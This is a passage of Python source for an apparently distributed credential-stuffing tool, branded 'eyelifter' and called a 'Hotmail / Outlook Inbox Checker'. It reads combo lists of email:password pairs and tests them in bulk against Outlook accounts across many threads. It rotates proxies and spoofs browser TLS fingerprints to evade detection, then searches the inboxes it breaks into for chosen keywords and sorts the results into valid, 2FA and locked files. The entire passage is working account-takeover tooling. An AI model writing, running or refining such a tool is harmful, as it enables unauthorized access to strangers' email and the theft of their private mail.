        eyelifter_log("❌", "ERROR", "INPUT", "invalid format [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] Enter to continue...')}")
        return

    scope = eyelifter_ask_scope()
    raw_kws = eyelifter_ask_keywords_single()
    kws = eyelifter_apply_scope(raw_kws, scope)
    eyelifter_log("🔑", "INFO", "KEYWORDS", ", ".join(raw_kws) + " [eyelifter]")

    if not _FOLDER:
        root = os.path.join(os.path.dirname(CFG_PATH), RESULTS)
        os.makedirs(root, exist_ok=True)
        ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
        _FOLDER = os.path.join(root, f"Single_{ts}_{tag}")
        os.makedirs(_FOLDER, exist_ok=True)

    proxy = None
    if proxies:
        if not _POOL:
            _POOL = list(proxies)
            _BADP = set()
        proxy = eyelifter_pick_proxy()

    eyelifter_log("🔍", "STEP", "CHECK", f"checking {combo.split(':')[0]} [eyelifter]")
    start = time.time()
    result = eyelifter_run_retry(combo, proxy, kws)
    el = time.time() - start

    st = result.get("status")
    if st == "hit":
        ms = result.get("matches", [])
        rows = [
            ("Status", "HIT"),
            ("Email", result.get("email")),
            ("Password", result.get("password")),
            ("Country", result.get("country") or "?"),
            ("Matched Keywords", str(len(ms))),
            ("Time", f"{el:.2f}s"),
            ("Credit", f"eyelifter · {TG_USER} · {TG_CHAN}"),
        ]
        eyelifter_summary(rows)
        if ms:
            print(eyelifter_color("96", "── keyword matches [eyelifter] ──", True))
            for m in ms:
                print(f"\n  [{m['keyword']}] — {m['count']} mail")
                for it in m["items"][:5]:
                    print(f"    • {it['subject'][:70]}")
                    print(f"      from: {it['from']}")
                    print(f"      at  : {it['date']}")
        else:
            print(eyelifter_color("90", "  no keyword matches in inbox"))
    elif st == "bad":
        eyelifter_log("❌", "ERROR", "RESULT",
                      f"bad creds - {result.get('reason', 'invalid')} [eyelifter]")
    elif st == "locked":
        eyelifter_log("🔒", "WARN", "RESULT",
                      f"LOCKED - {result.get('reason', 'account_locked')} "
                      f"| {TG_USER} | {TG_CHAN} [eyelifter]")
    elif st == "2fa":
        eyelifter_log("⚠️", "WARN", "RESULT",
                      f"2FA required - {result.get('reason', 'interrupt')} [eyelifter]")
    else:
        eyelifter_log("❌", "ERROR", "RESULT",
            f"{result.get('error_type', '')} – {result.get('msg', '')} [eyelifter]")

    if _loader.settings.get("debug", False):
        eyelifter_log("🐛", "DEBUG", "DUMP",
            f"session folder: {_FOLDER} (see Debug/ subfolder) [eyelifter]")

    if sys.stdin.isatty():
        input(f"{eyelifter_color('93', '[*] Enter to continue...')}")


def eyelifter_bulk_check(proxies):
    global _TOTAL, _INBOX_F, _VALID_F, _BAD_F, _2FA_F, _LOCKED_F, _ERR_F, _FOLDER
    global _POOL, _BADP, _KWSETS

    eyelifter_reset_stats()
    eyelifter_section("BULK CHECK [eyelifter]")

    path = input(f"{eyelifter_color('96', '[*] combo file > ')}").strip()
    if not path or not os.path.isfile(path):
        eyelifter_log("❌", "ERROR", "FILE", "file not found [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] Enter to continue...')}")
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()
    combos = eyelifter_extract_combos(content)
    if not combos:
        eyelifter_log("❌", "ERROR", "EXTRACT", "no valid combos [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] Enter to continue...')}")
        return

    scope = eyelifter_ask_scope()
    raw_kws = eyelifter_ask_keywords_bulk()
    kws = eyelifter_apply_scope(raw_kws, scope)
    eyelifter_log("🔑", "INFO", "KEYWORDS",
                  f"{len(raw_kws)} loaded: {', '.join(raw_kws[:5])}"
                  + (" ..." if len(raw_kws) > 5 else "") + " [eyelifter]")
    eyelifter_log("✅", "INFO", "EXTRACT", f"{len(combos)} unique combos [eyelifter]")

    new_threads = eyelifter_ask_threads()
    if new_threads != _loader.settings["threads"]:
        _loader.settings["threads"] = new_threads
        try:
            _loader.save()
        except Exception:
            pass
    eyelifter_log("⚙️", "INFO", "THREADS", f"{_loader.settings['threads']} [eyelifter]")

    root = os.path.join(os.path.dirname(CFG_PATH), RESULTS)
    os.makedirs(root, exist_ok=True)

    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _FOLDER = os.path.join(root, f"Session_{ts}_{tag}")
    os.makedirs(_FOLDER, exist_ok=True)

    try:
        (_INBOX_F, _VALID_F, _BAD_F, _2FA_F, _LOCKED_F, _ERR_F) = eyelifter_open_files(_FOLDER)
    except Exception as e:
        eyelifter_log("❌", "ERROR", "OPEN", f"could not open result files: {e} [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] Enter to continue...')}")
        return

    header = (f"# Hotmail Inbox Checker by eyelifter - {datetime.now().isoformat()}\n"
              f"# Checked by eyelifter\n# Seal: {SEAL}\n"
              f"# Credit: eyelifter | {TG_USER} | {TG_CHAN}\n"
              f"# Keywords: {', '.join(raw_kws)}\n"
              f"# Scope: {scope}\n"
              f"# Debug: {_loader.settings.get('debug', False)}\n\n")
    for fh in (_INBOX_F, _VALID_F, _BAD_F, _2FA_F, _LOCKED_F, _ERR_F):
        fh.write(header)

    _TOTAL = len(combos)
    eyelifter_log("📊", "INFO", "FILE", f"loaded {_TOTAL} [eyelifter]")

    if proxies:
        _POOL = list(proxies)
        _BADP = set()
        eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} loaded [eyelifter]")
    else:
        _POOL = []
        _BADP = set()
        eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct [eyelifter]")

    _STOP.clear()
    eyelifter_log("🚀", "INFO", "START",
        f"firing {_TOTAL} combos across {_loader.settings['threads']} threads "
        f"| {TG_USER} | {TG_CHAN} [eyelifter]")

    try:
        bulk_runner(combos, kws)
    except KeyboardInterrupt:
        _STOP.set()
        eyelifter_log("🛑", "WARN", "STOP", "stopping... [eyelifter]")
    except Exception as e:
        eyelifter_log("❌", "ERROR", "RUN", f"{type(e).__name__}: {str(e)[:120]} [eyelifter]")
    finally:
        _STOP.set()
        time.sleep(0.3)
        for fh in (_INBOX_F, _VALID_F, _BAD_F, _2FA_F, _LOCKED_F, _ERR_F):
            try:
                fh.close()
            except Exception:
                pass

    with _LK:
        snap = dict(_ST)
        ksnap = {k: len(v) for k, v in _KWSETS.items()}
        csnap = {k: len(v) for k, v in _CTRY_SETS.items()}
        lsnap = {k: len(v) for k, v in _LOCKREASONS.items()}
        r2snap = {k: len(v) for k, v in _REASONS_2FA.items()}

    for base, key in (
        ("ms_inbox_hits.txt", "inbox"),
        ("ms_valid.txt",      "hit"),
        ("ms_bad.txt",        "bad"),
        ("ms_2fa.txt",        "2fa"),
        ("ms_locked.txt",     "locked"),
        ("ms_errors.txt",     "errors"),
    ):
        old = os.path.join(_FOLDER, base)
        new = os.path.join(_FOLDER, base.replace(".txt", f"_{snap[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    eyelifter_log("💾", "INFO", "SAVE", f"results → {_FOLDER} [eyelifter]")
    eyelifter_divider()
    el = time.time() - _START
    eyelifter_summary([
        ("Total",        _TOTAL),
        ("Valid",        snap["hit"]),
        ("Inbox Hits",   snap["inbox"]),
        ("Bad creds",    snap["bad"]),
        ("Locked",       snap["locked"]),
        ("2FA",          snap["2fa"]),
        ("Errors",       snap["errors"]),
        ("Rate limited", snap["rl"]),
        ("Temp retries", snap.get("temp", 0)),
        ("Proxy fails",  snap["pfails"]),
        ("Time",         f"{el:.1f}s"),
        ("Speed",        f"{_TOTAL / max(el, 0.001):.2f} combo/s"),
        ("Folder",       _FOLDER),
        ("Credit",       f"eyelifter · {TG_USER} · {TG_CHAN}"),
    ])
    if ksnap:
        print(eyelifter_color("96", "── keyword breakdown [eyelifter] ──", True))
        for kw, cnt in sorted(ksnap.items(), key=lambda x: x[1], reverse=True):
            print(f"  {kw:45s}  {cnt} accounts")
    if csnap:
        print(eyelifter_color("96", "── country breakdown [eyelifter] ──", True))
        for c, n in sorted(csnap.items(), key=lambda x: x[1], reverse=True):
            print(f"  {c:4s}  {n} accounts")
    if lsnap:
        print(eyelifter_color("96", "── locked breakdown [eyelifter] ──", True))
        for r, n in sorted(lsnap.items(), key=lambda x: x[1], reverse=True):
            print(f"  {r:45s}  {n} accounts")
    if r2snap:
        print(eyelifter_color("96", "── 2FA breakdown [eyelifter] ──", True))
        for r, n in sorted(r2snap.items(), key=lambda x: x[1], reverse=True):
            print(f"  {r:45s}  {n} accounts")
    if _loader.settings.get("debug", False):
        eyelifter_log("🐛", "DEBUG", "DUMP",
            f"session folder: {_FOLDER} (see Debug/ subfolder) [eyelifter]")
    if sys.stdin.isatty():
        input(f"{eyelifter_color('93', '[*] Enter to continue...')}")


single_check = eyelifter_single_check
bulk_check = eyelifter_bulk_check


def eyelifter_settings_menu():
    eyelifter_section("SETTINGS [eyelifter]")
    s = _loader.settings
    print(f"  [1]  Threads:              {s['threads']}  (1-{MAX_THREADS})")
    print(f"  [2]  Timeout:              {s['timeout']}s")
    print(f"  [3]  Retries:              {s['retries']}  (0-6)")
    print(f"  [4]  Combo Delay:          {s['combo_delay']}s")
    print(f"  [5]  Proxy File:           {s['proxies_file']}")
    print(f"  [6]  Impersonate:          {s['impersonate']}")
    print(f"  [7]  Skip Proxy Test:      {s['skip_proxy_test']}")
    print(f"  [8]  Rate-limit Delay:     {s['rate_limit_delay']}s")
    print(f"  [9]  FP Rotate:            {s['fp_rotate']}  (session/attempt/fixed)")
    print(f"  [10] FP Pool:              {s['fp_pool'] or 'auto'}")
    print(f"  [11] FP Jitter (TLS/H2):   {s['fp_jitter']}")
    print(f"  [12] Debug dumps:          {s['debug']}")
    print(f"  [0]  Back")

    ch = input(f"{eyelifter_color('96', '[*] Select: ')}").strip()
    changed = False
    try:
        if ch == "1":
            s["threads"] = max(1, min(MAX_THREADS, int(input(f"Threads (1-{MAX_THREADS}): "))))
            changed = True
        elif ch == "2":
            s["timeout"] = max(5, min(120, int(input("Timeout (5-120): "))))
            changed = True
        elif ch == "3":
            s["retries"] = max(0, min(6, int(input("Retries (0-6): "))))
            changed = True
        elif ch == "4":
            s["combo_delay"] = max(0.0, min(60.0, float(input("Combo delay (s): "))))
            changed = True
        elif ch == "5":
            v = input("Proxies file: ").strip()
            if v:
                s["proxies_file"] = v
                changed = True
        elif ch == "6":
            v = input("Impersonate (chrome/chrome131/...): ").strip()
            if v:
                s["impersonate"] = v
                changed = True
        elif ch == "7":
            s["skip_proxy_test"] = not s["skip_proxy_test"]
            changed = True
        elif ch == "8":
            s["rate_limit_delay"] = max(1, min(120, int(input("Rate-limit delay (s): "))))
            changed = True
        elif ch == "9":
            v = input("FP rotate (session/attempt/fixed) [blank=session]: ").strip().lower()
            s["fp_rotate"] = v if v in ("session", "attempt", "fixed") else "session"
            changed = True
        elif ch == "10":
            v = input("FP pool (comma list, blank=auto): ").strip()
            s["fp_pool"] = v
            reset_fp_cycle()
            changed = True
        elif ch == "11":
            s["fp_jitter"] = not s["fp_jitter"]
            reset_fp_cycle()
            changed = True
        elif ch == "12":
            s["debug"] = not s["debug"]
            changed = True
        elif ch == "0":
            return
    except (ValueError, TypeError):
        eyelifter_log("❌", "ERROR", "CONFIG", "invalid [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if changed:
        try:
            _loader.save()
            eyelifter_log("💾", "INFO", "CONFIG", "saved [eyelifter]")
        except Exception as e:
            eyelifter_log("⚠️", "WARN", "CONFIG", f"save failed: {e} [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] Enter to continue...')}")


settings_menu = eyelifter_settings_menu


def eyelifter_main():
    eyelifter_verify("main")
    if _loader.settings.get("open_channel_on_launch", True):
        def _open():
            time.sleep(0.4)
            try:
                import subprocess
                for cmd in ("termux-open-url", "xdg-open", "open"):
                    if shutil.which(cmd):
                        subprocess.Popen(
                            [cmd, f"https://t.me/{TG_CHAN.lstrip('@')}"],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                            stdin=subprocess.DEVNULL, start_new_session=True,
                            close_fds=True)
                        return
            except Exception:
                pass
        threading.Thread(target=_open, daemon=True).start()

    eyelifter_banner(TOOL, "Hotmail / Outlook Inbox Checker")
    fp = pick_fp(peek=True)
    eyelifter_log("🧬", "INFO", "FINGERPRINT",
        f"{len(_fp_targets())} targets · rotate={_loader.settings.get('fp_rotate')}"
        f"{' · jitter' if _loader.settings.get('fp_jitter') else ''}"
        f" · eg {fp['imp']} [eyelifter]")
    eyelifter_log("📣", "INFO", "CREDIT",
        f"eyelifter · {TG_USER} · {TG_CHAN} [eyelifter]")
    eyelifter_log("🐛", "INFO", "DEBUG",
        f"{'ON — dumping every response' if _loader.settings.get('debug') else 'OFF'} [eyelifter]")
    proxies = eyelifter_load_proxies()

    while True:
        eyelifter_verify("menu")
        eyelifter_section(f"MAIN MENU · {TG_USER} · {TG_CHAN} [eyelifter]")
        if proxies:
            eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} proxies loaded [eyelifter]")
        else:
            eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct [eyelifter]")
        print("[1] Single check")
        print("[2] Bulk check from file")
        print("[3] Settings")
        print("[4] Exit")
        choice = input(f"{eyelifter_color('93', '[*] Select: ')}").strip()

        if choice == "1":
            eyelifter_single_check(proxies)
        elif choice == "2":
            _STOP.clear()
            eyelifter_bulk_check(proxies)
        elif choice == "3":
            eyelifter_settings_menu()
            proxies = eyelifter_load_proxies()
        elif choice == "4":
            print("Exiting...")
            break
        else:
            eyelifter_log("❌", "ERROR", "INPUT", "invalid choice [eyelifter]")


main = eyelifter_main

if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except KeyboardInterrupt:
        print("\nExiting...")
    except Exception as e:
        print(f"[FATAL] {type(e).__name__}: {e}")